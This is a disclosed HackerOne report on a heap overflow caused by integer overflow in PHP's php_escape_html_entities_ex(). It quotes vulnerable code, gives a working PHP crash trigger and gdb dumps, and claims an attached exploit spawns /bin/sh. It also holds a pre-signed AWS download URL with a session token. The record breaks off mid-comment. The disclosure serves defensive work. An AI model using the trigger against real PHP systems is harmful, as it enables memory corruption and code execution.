{"id":180582,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1ODI=","url":"https://hackerone.com/reports/180582","title":"Heap overflow due to integer overflow in php_escape_html_entities_ex() function","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-11-07T07:21:42.625Z","submitted_at":"2016-11-07T07:21:42.625Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fosec","url":"/fosec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:22:04.703Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:22:02.897Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73398\nDescription:\n------------\nI have found some vulnerable code at ```php_escape_html_entities_ex()``` function. ```php_escape_html_entities_ex()``` function creates a new zend_string object to store html data. The size of destination string depends on the size of source string. ( refer at `ext/standard/html.c:1272` )\n\n``` c\nPHPAPI zend_string *php_escape_html_entities_ex(unsigned char *old, size_t oldlen, int all, int flags, char *hint_charset, zend_bool double_encode)\n{\n...\n\t/* initial estimate */\n\tif (oldlen \u003c 64) {\n\t\tmaxlen = 128;\n\t} else {\n\t\tmaxlen = 2 * oldlen;\n\t\tif (maxlen \u003c oldlen) {\n\t\t\tzend_throw_error(NULL, \"Input string is too long\");\n\t\t\treturn NULL;\n\t\t}\n\t}\n\nreplaced = zend_string_alloc(maxlen, 0);\n...\n}\n```\n\nIf `oldlen` is equal to PHP_INT_MAX, `maxlen` will be an unexpected value and `zend_string_alloc()` function will allocate a small memory range. Due to missing check of size before calling\n`zend_string_alloc()`, this new memory range can not use to store large html data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.\n\nSolution:\nIt should be `zend_string_alloc_safe` instead of `zend_string_alloc`. \n\nTest script:\n---------------\n``` php\n\u003c?php\nini_set('memory_limit', -1);\n$s = str_repeat(\"A\", PHP_INT_MAX);\nhtmlentities($s, 0, \"\", true);\n?\u003e\n```\nActual result:\n--------------\nOpen php program in gdb and run test script, set a breakpoint at line in file `ext/standard/html.c:1269`.\nWhen debugger stops, we have `oldlen=0x7fffffff`. Because `oldlen` is bigger than 0x64, `maxlen` is equal to twice `oldlen`. `maxlen` is equal to 0xfffffffe. \n```\n [----------------------------------registers-----------------------------------]\nEAX: 0xfffffffe\nEBX: 0x1\nECX: 0x10\nEDX: 0x5\nESI: 0xb7814100 --\u003e 0x2\nEDI: 0xfffffffe\nEBP: 0xbfffbf68 --\u003e 0xbfffbfb8 --\u003e 0xbfffc084 --\u003e 0x0\nESP: 0xbfffbee0 --\u003e 0x80001000 ('A' \u003crepeats 200 times\u003e...)\nEIP: 0x826e37a (\u003cphp_escape_html_entities_ex+442\u003e:      call   0x82fc010 \u003c_emalloc\u003e)\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x826e371 \u003cphp_escape_html_entities_ex+433\u003e: mov    edi,DWORD PTR [ebp-0x34]\n   0x826e374 \u003cphp_escape_html_entities_ex+436\u003e: lea    ecx,[edi+0x14]\n   0x826e377 \u003cphp_escape_html_entities_ex+439\u003e: and    ecx,0xfffffffc\n=\u003e 0x826e37a \u003cphp_escape_html_entities_ex+442\u003e: call   0x82fc010 \u003c_emalloc\u003e\n   0x826e37f \u003cphp_escape_html_entities_ex+447\u003e: mov    esi,eax\n   0x826e381 \u003cphp_escape_html_entities_ex+449\u003e: mov    DWORD PTR [eax],0x1\n   0x826e387 \u003cphp_escape_html_entities_ex+455\u003e: mov    DWORD PTR [eax+0x4],0x6\n   0x826e38e \u003cphp_escape_html_entities_ex+462\u003e: mov    DWORD PTR [eax+0x8],0x0\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbee0 --\u003e 0x80001000 ('A' \u003crepeats 200 times\u003e...)\n0004| 0xbfffbee4 --\u003e 0xb7ce07e9 (\u003cmadvise+25\u003e:  pop    ebx)\n0008| 0xbfffbee8 --\u003e 0xb7ce07f7 (\u003cmadvise+39\u003e:  add    ecx,0xc7809)\n0012| 0xbfffbeec --\u003e 0x82f9774 (\u003czend_mm_chunk_alloc_int+100\u003e:  mov    eax,esi)\n0016| 0xbfffbef0 --\u003e 0x37400000 --\u003e 0x2\n0020| 0xbfffbef4 --\u003e 0x80001000 ('A' \u003crepeats 200 times\u003e...)\n0024| 0xbfffbef8 --\u003e 0xe\n0028| 0xbfffbefc --\u003e 0x88dd0c0 --\u003e 0x88dd0f8 --\u003e 0x2\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0826e37a      122             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\ngdb-peda$\n```\n\n\nThe size which is used as parameter in `_emalloc()` function is equal to `((oldlen * 2 + 0x14 ) \u0026 0xfffffffc)`. Due to integer overflow, if `oldlen` is equal to 0x7fffffff, this size is 0x10. The new memory region is too small to store a large string! \n\nif we continue running, other memory region will be overwritten until SIGSEGV!\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x41 ('A')\nEBX: 0x199fa0\nECX: 0x37599fb0 ('A' \u003crepeats 200 times\u003e...)\nEDX: 0x3\nESI: 0x199fa1\nEDI: 0xb7866050 --\u003e 0x1\nEBP: 0xbfffbf68 --\u003e 0xbfffbfb8 --\u003e 0xbfffc084 --\u003e 0x0\nESP: 0xbfffbee0 --\u003e 0x80001000 ('A' \u003crepeats 200 times\u003e...)\nEIP: 0x826eaf1 (\u003cphp_escape_html_entities_ex+2353\u003e:     mov    BYTE PTR [edi+ebx*1+0x10],al)\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x826eae8 \u003cphp_escape_html_entities_ex+2344\u003e:        mov    ebx,DWORD PTR [ebp-0x38]\n   0x826eaeb \u003cphp_escape_html_entities_ex+2347\u003e:        movzx  eax,BYTE PTR [ecx]\n   0x826eaee \u003cphp_escape_html_entities_ex+2350\u003e:        mov    esi,DWORD PTR [ebp-0x30]\n=\u003e 0x826eaf1 \u003cphp_escape_html_entities_ex+2353\u003e:        mov    BYTE PTR [edi+ebx*1+0x10],al\n   0x826eaf5 \u003cphp_escape_html_entities_ex+2357\u003e:        lea    eax,[ebx+0x1]\n   0x826eaf8 \u003cphp_escape_html_entities_ex+2360\u003e:        mov    DWORD PTR [ebp-0x38],eax\n   0x826eafb \u003cphp_escape_html_entities_ex+2363\u003e:        jmp    0x826e810 \u003cphp_escape_html_entities_ex+1616\u003e\n   0x826eb00 \u003cphp_escape_html_entities_ex+2368\u003e:        test   BYTE PTR [ebp+0x14],0x2\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbee0 --\u003e 0x80001000 ('A' \u003crepeats 200 times\u003e...)\n0004| 0xbfffbee4 --\u003e 0xb7ce07e9 (\u003cmadvise+25\u003e:  pop    ebx)\n0008| 0xbfffbee8 --\u003e 0xb7ce07f7 (\u003cmadvise+39\u003e:  add    ecx,0xc7809)\n0012| 0xbfffbeec --\u003e 0x82f9774 (\u003czend_mm_chunk_alloc_int+100\u003e:  mov    eax,esi)\n0016| 0xbfffbef0 --\u003e 0x37400000 --\u003e 0x2\n0020| 0xbfffbef4 --\u003e 0x80001000 ('A' \u003crepeats 200 times\u003e...)\n0024| 0xbfffbef8 --\u003e 0xe\n0028| 0xbfffbefc --\u003e 0x88dd0c0 --\u003e 0x88dd0f8 --\u003e 0x2\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0826eaf1 in php_escape_html_entities_ex (old=0x37400010 'A' \u003crepeats 200 times\u003e..., oldlen=0x7fffffff, all=\u003coptimized out\u003e, all@entry=0x1, flags=0x0, hint_charset=0x88cce38 \"\",\n    double_encode=double_encode@entry=0x1) at /root/fuzzer/PHP-7.1/ext/standard/html.c:1378\n1378                                            ZSTR_VAL(replaced)[len++] = mbsequence[0];\ngdb-peda$\n```\nI can leak memory to bypass ASLR + DEP and control eip register to the arbitrary value. Finally, the overflow results as arbitrary code execution. The attached script which executes at local machine can leak library data and run `/bin/sh`. :)\n","vulnerability_information_html":"\u003cp\u003eThe fix for this bug has been committed: \u003ca title=\"https://bugs.php.net/bug.php?id=73398\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73398\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=73398\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eI have found some vulnerable code at \u003ccode\u003ephp_escape_html_entities_ex()\u003c/code\u003e function. \u003ccode\u003ephp_escape_html_entities_ex()\u003c/code\u003e function creates a new zend_string object to store html data. The size of destination string depends on the size of source string. ( refer at \u003ccode\u003eext/standard/html.c:1272\u003c/code\u003e )\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ePHPAPI\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_string\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nf\"\u003ephp_escape_html_entities_ex\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eold\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003eoldlen\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eall\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eflags\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ehint_charset\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_bool\u003c/span\u003e \u003cspan class=\"n\"\u003edouble_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"cm\"\u003e/* initial estimate */\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoldlen\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e64\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003emaxlen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003emaxlen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eoldlen\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emaxlen\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eoldlen\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ezend_throw_error\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Input string is too long\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ereplaced\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_string_alloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emaxlen\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf \u003ccode\u003eoldlen\u003c/code\u003e is equal to PHP_INT_MAX, \u003ccode\u003emaxlen\u003c/code\u003e will be an unexpected value and \u003ccode\u003ezend_string_alloc()\u003c/code\u003e function will allocate a small memory range. Due to missing check of size before calling\u003cbr\u003e\n\u003ccode\u003ezend_string_alloc()\u003c/code\u003e, this new memory range can not use to store large html data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.\u003c/p\u003e\n\n\u003cp\u003eSolution:\u003cbr\u003e\nIt should be \u003ccode\u003ezend_string_alloc_safe\u003c/code\u003e instead of \u003ccode\u003ezend_string_alloc\u003c/code\u003e. \u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eini_set\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;memory_limit\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;A\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ePHP_INT_MAX\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ehtmlentities\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"actual-result\"\u003eActual result:\u003c/h2\u003e\n\n\u003cp\u003eOpen php program in gdb and run test script, set a breakpoint at line in file \u003ccode\u003eext/standard/html.c:1269\u003c/code\u003e.\u003cbr\u003e\nWhen debugger stops, we have \u003ccode\u003eoldlen=0x7fffffff\u003c/code\u003e. Because \u003ccode\u003eoldlen\u003c/code\u003e is bigger than 0x64, \u003ccode\u003emaxlen\u003c/code\u003e is equal to twice \u003ccode\u003eoldlen\u003c/code\u003e. \u003ccode\u003emaxlen\u003c/code\u003e is equal to 0xfffffffe. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e [----------------------------------registers-----------------------------------]\nEAX: 0xfffffffe\nEBX: 0x1\nECX: 0x10\nEDX: 0x5\nESI: 0xb7814100 --\u0026gt; 0x2\nEDI: 0xfffffffe\nEBP: 0xbfffbf68 --\u0026gt; 0xbfffbfb8 --\u0026gt; 0xbfffc084 --\u0026gt; 0x0\nESP: 0xbfffbee0 --\u0026gt; 0x80001000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEIP: 0x826e37a (\u0026lt;php_escape_html_entities_ex+442\u0026gt;:      call   0x82fc010 \u0026lt;_emalloc\u0026gt;)\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x826e371 \u0026lt;php_escape_html_entities_ex+433\u0026gt;: mov    edi,DWORD PTR [ebp-0x34]\n   0x826e374 \u0026lt;php_escape_html_entities_ex+436\u0026gt;: lea    ecx,[edi+0x14]\n   0x826e377 \u0026lt;php_escape_html_entities_ex+439\u0026gt;: and    ecx,0xfffffffc\n=\u0026gt; 0x826e37a \u0026lt;php_escape_html_entities_ex+442\u0026gt;: call   0x82fc010 \u0026lt;_emalloc\u0026gt;\n   0x826e37f \u0026lt;php_escape_html_entities_ex+447\u0026gt;: mov    esi,eax\n   0x826e381 \u0026lt;php_escape_html_entities_ex+449\u0026gt;: mov    DWORD PTR [eax],0x1\n   0x826e387 \u0026lt;php_escape_html_entities_ex+455\u0026gt;: mov    DWORD PTR [eax+0x4],0x6\n   0x826e38e \u0026lt;php_escape_html_entities_ex+462\u0026gt;: mov    DWORD PTR [eax+0x8],0x0\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbee0 --\u0026gt; 0x80001000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0004| 0xbfffbee4 --\u0026gt; 0xb7ce07e9 (\u0026lt;madvise+25\u0026gt;:  pop    ebx)\n0008| 0xbfffbee8 --\u0026gt; 0xb7ce07f7 (\u0026lt;madvise+39\u0026gt;:  add    ecx,0xc7809)\n0012| 0xbfffbeec --\u0026gt; 0x82f9774 (\u0026lt;zend_mm_chunk_alloc_int+100\u0026gt;:  mov    eax,esi)\n0016| 0xbfffbef0 --\u0026gt; 0x37400000 --\u0026gt; 0x2\n0020| 0xbfffbef4 --\u0026gt; 0x80001000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0024| 0xbfffbef8 --\u0026gt; 0xe\n0028| 0xbfffbefc --\u0026gt; 0x88dd0c0 --\u0026gt; 0x88dd0f8 --\u0026gt; 0x2\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0826e37a      122             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\ngdb-peda$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe size which is used as parameter in \u003ccode\u003e_emalloc()\u003c/code\u003e function is equal to \u003ccode\u003e((oldlen * 2 + 0x14 ) \u0026amp; 0xfffffffc)\u003c/code\u003e. Due to integer overflow, if \u003ccode\u003eoldlen\u003c/code\u003e is equal to 0x7fffffff, this size is 0x10. The new memory region is too small to store a large string! \u003c/p\u003e\n\n\u003cp\u003eif we continue running, other memory region will be overwritten until SIGSEGV!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e [----------------------------------registers-----------------------------------]\nEAX: 0x41 (\u0026#39;A\u0026#39;)\nEBX: 0x199fa0\nECX: 0x37599fb0 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEDX: 0x3\nESI: 0x199fa1\nEDI: 0xb7866050 --\u0026gt; 0x1\nEBP: 0xbfffbf68 --\u0026gt; 0xbfffbfb8 --\u0026gt; 0xbfffc084 --\u0026gt; 0x0\nESP: 0xbfffbee0 --\u0026gt; 0x80001000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEIP: 0x826eaf1 (\u0026lt;php_escape_html_entities_ex+2353\u0026gt;:     mov    BYTE PTR [edi+ebx*1+0x10],al)\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x826eae8 \u0026lt;php_escape_html_entities_ex+2344\u0026gt;:        mov    ebx,DWORD PTR [ebp-0x38]\n   0x826eaeb \u0026lt;php_escape_html_entities_ex+2347\u0026gt;:        movzx  eax,BYTE PTR [ecx]\n   0x826eaee \u0026lt;php_escape_html_entities_ex+2350\u0026gt;:        mov    esi,DWORD PTR [ebp-0x30]\n=\u0026gt; 0x826eaf1 \u0026lt;php_escape_html_entities_ex+2353\u0026gt;:        mov    BYTE PTR [edi+ebx*1+0x10],al\n   0x826eaf5 \u0026lt;php_escape_html_entities_ex+2357\u0026gt;:        lea    eax,[ebx+0x1]\n   0x826eaf8 \u0026lt;php_escape_html_entities_ex+2360\u0026gt;:        mov    DWORD PTR [ebp-0x38],eax\n   0x826eafb \u0026lt;php_escape_html_entities_ex+2363\u0026gt;:        jmp    0x826e810 \u0026lt;php_escape_html_entities_ex+1616\u0026gt;\n   0x826eb00 \u0026lt;php_escape_html_entities_ex+2368\u0026gt;:        test   BYTE PTR [ebp+0x14],0x2\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbee0 --\u0026gt; 0x80001000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0004| 0xbfffbee4 --\u0026gt; 0xb7ce07e9 (\u0026lt;madvise+25\u0026gt;:  pop    ebx)\n0008| 0xbfffbee8 --\u0026gt; 0xb7ce07f7 (\u0026lt;madvise+39\u0026gt;:  add    ecx,0xc7809)\n0012| 0xbfffbeec --\u0026gt; 0x82f9774 (\u0026lt;zend_mm_chunk_alloc_int+100\u0026gt;:  mov    eax,esi)\n0016| 0xbfffbef0 --\u0026gt; 0x37400000 --\u0026gt; 0x2\n0020| 0xbfffbef4 --\u0026gt; 0x80001000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0024| 0xbfffbef8 --\u0026gt; 0xe\n0028| 0xbfffbefc --\u0026gt; 0x88dd0c0 --\u0026gt; 0x88dd0f8 --\u0026gt; 0x2\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0826eaf1 in php_escape_html_entities_ex (old=0x37400010 \u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;..., oldlen=0x7fffffff, all=\u0026lt;optimized out\u0026gt;, all@entry=0x1, flags=0x0, hint_charset=0x88cce38 \u0026quot;\u0026quot;,\n    double_encode=double_encode@entry=0x1) at /root/fuzzer/PHP-7.1/ext/standard/html.c:1378\n1378                                            ZSTR_VAL(replaced)[len++] = mbsequence[0];\ngdb-peda$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI can leak memory to bypass ASLR + DEP and control eip register to the arbitrary value. Finally, the overflow results as arbitrary code execution. The attached script which executes at local machine can leak library data and run \u003ccode\u003e/bin/sh\u003c/code\u003e. :)\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":133280,"file_name":"php_escape_html_entities_ex_exploit.php","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/133/280/447666aa2c067223454f5191fdf63f98702e99ba/php_escape_html_entities_ex_exploit.php?response-content-disposition=attachment%3B%20filename%3D%22php_escape_html_entities_ex_exploit.php%22%3B%20filename%2A%3DUTF-8%27%27php_escape_html_entities_ex_exploit.php\u0026response-content-type=text%2Fx-php\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044508Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=3c566cdbf160a0e34f8234ba63159028dc451f7b307186bdd57ea5774dab4201","file_size":13012,"type":"text/x-php"}],"allow_singular_disclosure_at":"2019-11-12T09:22:03.016Z","allow_singular_disclosure_after":-35666585.70229562,"singular_disclosure_allowed":true,"vote_count":1,"voters":["spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1287097,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I use PHP-7.1 (at https://github.com/php/php-src, commit 931ea5c872a0a4455c5bbb8470c7a1d049bd8501).","markdown_message":"\u003cp\u003eI use PHP-7.1 (at \u003ca title=\"https://github.com/php/php-src\" 